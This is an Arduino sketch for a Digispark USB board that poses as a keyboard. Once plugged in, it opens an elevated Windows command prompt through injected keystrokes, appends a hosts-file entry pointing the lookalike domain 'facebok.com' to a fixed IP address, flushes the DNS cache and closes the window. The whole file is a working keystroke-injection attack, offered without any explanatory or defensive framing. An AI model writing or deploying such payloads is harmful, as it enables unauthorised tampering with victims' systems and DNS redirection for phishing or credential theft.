#include <DigiKeyboard.h>

#define KEY_ESC 41

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  //This opens an administrator command prompt
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("cmd"));
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_RIGHT);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.println("ECHO 143.47.181.65 facebok.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ipconfig /flushdns");
  DigiKeyboard.println("exit");
}

void loop() {
}
